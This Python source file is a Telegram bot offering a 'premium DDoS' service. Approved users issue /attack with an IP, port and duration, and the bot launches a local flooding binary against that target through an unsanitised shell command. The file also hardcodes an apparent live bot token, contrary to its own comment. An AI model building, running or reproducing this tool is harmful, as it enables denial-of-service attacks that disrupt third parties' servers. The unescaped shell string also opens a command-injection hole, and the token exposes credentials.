import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os

# Configuration
TELEGRAM_BOT_TOKEN = ("7956789514:AAGxj-xIj_wfkYMX-qniQOewRtyLKcMWXko")  # Fetch token from environment variable
ADMIN_USER_ID = 1549748318
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@RAJOWNER9090"  # Replace with your channel username
attack_in_progress = False

# Check if the token is set
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")

# Load and Save Functions for Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file.readlines())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

approved_ids = load_approved_ids()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐀𝐑𝐊 𝐗 𝐒𝐄𝐑𝐕𝐄𝐑 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃 𝐘𝐀𝐍𝐇𝐀 𝐓𝐔𝐌 𝐇𝐀𝐂𝐊𝐄𝐑 𝐁𝐀𝐍𝐍𝐄 𝐊𝐀 𝐒𝐀𝐏𝐍𝐀 𝐒𝐀𝐊𝐀𝐑 𝐊𝐀𝐑 𝐒𝐀𝐊𝐓𝐄 𝐇𝐎😂*\n\n"
        "*𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓*\n"
        "*𝐎𝐖𝐍𝐄𝐑*: @RajOwner90\n"
        f"🔔 *𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋*: {CHANNEL_ID} 𝐏𝐇𝐈𝐑 𝐓𝐔𝐌 𝐈𝐒𝐊𝐀 𝐌𝐀𝐙𝐀 𝐋𝐄 𝐒𝐀𝐊𝐓𝐄 𝐇𝐎.\n\n"
        "𝐔𝐒𝐄 /help 𝐓𝐎 𝐒𝐄𝐄 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/alluser - List all approved users and groups (admin only).\n"
        "/attack <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄> - 𝐋𝐀𝐔𝐍𝐂𝐇 𝐀𝐍 𝐀𝐓𝐓𝐀𝐂𝐊 (approved users only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group ID to use the bot."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐎𝐍𝐋𝐘 𝐑𝐀𝐉 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    # Extract the target ID
    target_id = args[0].strip()

    # Validate that the target ID is a number
    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    # Add the target ID to the approved list
    approved_ids.add(target_id)
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    """Remove a user or group ID from the approved list."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐎𝐍𝐋𝐘 𝐑𝐀𝐉 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

async def alluser(update: Update, context: CallbackContext):
    """List all approved users and groups."""
    chat_id = update.effective_chat.id

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐎𝐍𝐋𝐘 𝐑𝐀𝐉 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.*", parse_mode='Markdown')
        return

    if not approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
        return

    user_list = "\n".join(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*Approved Users and Groups:*\n\n{user_list}", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and a channel member."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐈𝐒 𝐁𝐎𝐓 𝐊𝐀 𝐔𝐏𝐀𝐘𝐎𝐆 𝐊𝐀𝐑𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐀𝐀𝐏𝐀𝐊𝐎 𝐎𝐖𝐍𝐄𝐑 𝐊𝐈 𝐀𝐍𝐔𝐌𝐀𝐓𝐈 𝐊𝐈 𝐀𝐀𝐕𝐀𝐒𝐇𝐘𝐀𝐊𝐴𝐓𝐴 𝐇𝐀𝐈 @RAJOWNER90.*", parse_mode='Markdown')
        return

    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 𝐏𝐄𝐇𝐋𝐄 𝐓𝐔𝐌𝐇𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑𝐍𝐀 𝐇𝐎𝐆𝐀 ({CHANNEL_ID}) 𝐏𝐇𝐈𝐑 𝐓𝐔𝐌 𝐈𝐒𝐊𝐀 𝐌𝐀𝐙𝐀 𝐋𝐄 𝐒𝐀𝐊𝐓𝐄 𝐇𝐎.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐀𝐁𝐄 𝐑𝐔𝐊 𝐉𝐀 𝐏𝐄𝐇𝐋𝐄 𝐖𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇 𝐇𝐎𝐍𝐄 𝐃𝐄 𝐏𝐇𝐈𝐑 𝐓𝐔𝐌 𝐀𝐓𝐓𝐀𝐂𝐊 𝐌𝐀𝐑𝐍𝐀 .*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*𝐔𝐒𝐀𝐆𝐄: /attack <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>*", parse_mode='Markdown')
        return

    ip, port, time = args

    # Limit time to 120 seconds
    try:
        time = int(time)
        if time > 120:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum attack time is 120 seconds.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid time format. Must be an integer.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆 𝐆𝐘𝐀 𝐂𝐇𝐄𝐂𝐊 𝐊𝐀𝐑 ✅*\n"
        f"*🎯 𝐓𝐀𝐑𝐆𝐄𝐓:* {ip}\n"
        f"*🔌 𝐏𝐎𝐑𝐓:* {port}\n"
        f"*⏱ 𝐓𝐈𝐌𝐄:* {time} seconds\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        # You can replace this line with the actual attack logic
        process = await asyncio.create_subprocess_shell(
            f"./ALONE {ip} {port} {time} 900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*♥️ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ♥️*\n"
        "*𝐒𝐄𝐍𝐃 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐓𝐎 𝐎𝐖𝐍𝐄𝐑 :-@RAJOWNER90*" , parse_mode='Markdown')

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("alluser", alluser))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
            
